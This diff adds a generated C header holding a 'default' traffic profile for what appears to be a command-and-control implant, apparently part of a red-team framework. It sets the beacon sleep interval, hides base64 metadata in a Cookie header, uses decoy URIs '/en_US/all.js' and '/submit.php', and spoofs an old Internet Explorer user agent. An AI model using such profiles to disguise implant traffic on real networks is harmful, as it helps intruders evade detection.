@@ -1,0 +1,103 @@
+#ifndef PROFILE_GENERATED_H
+#define PROFILE_GENERATED_H
+
+#include "transform.h"
+#include "profile.h"
+
+#define PROFILE_NAME "default"
+#define PROFILE_VERSION 1
+#define PROFILE_GENERATED_BY "InsertProfile.py v1.0"
+#define PROFILE_SLEEP_TIME 60000
+#define PROFILE_JITTER 0
+
+static const transform_step_t default_metadata_steps[] = {
+    { TRANSFORM_BASE64, NULL },
+};
+
+static const transform_chain_t default_metadata_chain = {
+    .steps = default_metadata_steps,
+    .step_count = 1,
+    .terminator = TERMINATOR_HEADER,
+    .terminator_arg = "Cookie",
+};
+
+static const transform_step_t default_output_steps[] = {
+    { TRANSFORM_BASE64, NULL },
+};
+
+static const transform_chain_t default_output_chain = {
+    .steps = default_output_steps,
+    .step_count = 1,
+    .terminator = TERMINATOR_PRINT,
+    .terminator_arg = NULL,
+};
+
+static const transform_step_t default_id_steps[] = {
+    { TRANSFORM_BASE64, NULL },
+};
+
+static const transform_chain_t default_id_chain = {
+    .steps = default_id_steps,
+    .step_count = 1,
+    .terminator = TERMINATOR_PARAMETER,
+    .terminator_arg = "id",
+};
+
+static const transform_step_t default_server_get_steps[] = {
+    { TRANSFORM_BASE64, NULL },
+};
+
+static const transform_chain_t default_server_get_chain = {
+    .steps = default_server_get_steps,
+    .step_count = 1,
+    .terminator = TERMINATOR_PRINT,
+    .terminator_arg = NULL,
+};
+
+static const transform_step_t default_server_post_steps[] = {
+    { TRANSFORM_BASE64, NULL },
+};
+
+static const transform_chain_t default_server_post_chain = {
+    .steps = default_server_post_steps,
+    .step_count = 1,
+    .terminator = TERMINATOR_PRINT,
+    .terminator_arg = NULL,
+};
+
+static const char *default_get_uris[] = { "/en_US/all.js" };
+static const char *default_post_uris[] = { "/submit.php" };
+
+static const profile_header_t default_get_headers[] = {
+    { "Accept", "*/*" },
+    { "Connection", "Keep-Alive" },
+    { "Cache-Control", "no-cache" },
+};
+
+static const profile_header_t default_post_headers[] = {
+    { "Content-Type", "application/octet-stream" },
+    { "Accept", "*/*" },
+    { "Connection", "Keep-Alive" },
+};
+
+#define GENERATED_GET_URIS default_get_uris
+#define GENERATED_GET_URI_COUNT 1
+#define GENERATED_GET_VERB "GET"
+#define GENERATED_GET_HEADERS default_get_headers
+#define GENERATED_GET_HEADER_COUNT 3
+#define GENERATED_METADATA_TRANSFORM default_metadata_chain
+
+#define GENERATED_POST_URIS default_post_uris
+#define GENERATED_POST_URI_COUNT 1
+#define GENERATED_POST_VERB "POST"
+#define GENERATED_POST_HEADERS default_post_headers
+#define GENERATED_POST_HEADER_COUNT 3
+#define GENERATED_ID_TRANSFORM default_id_chain
+#define GENERATED_OUTPUT_TRANSFORM default_output_chain
+
+#define GENERATED_SERVER_GET_TRANSFORM default_server_get_chain
+#define GENERATED_SERVER_POST_TRANSFORM default_server_post_chain
+
+#define GENERATED_USER_AGENT "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)"
+
+#endif
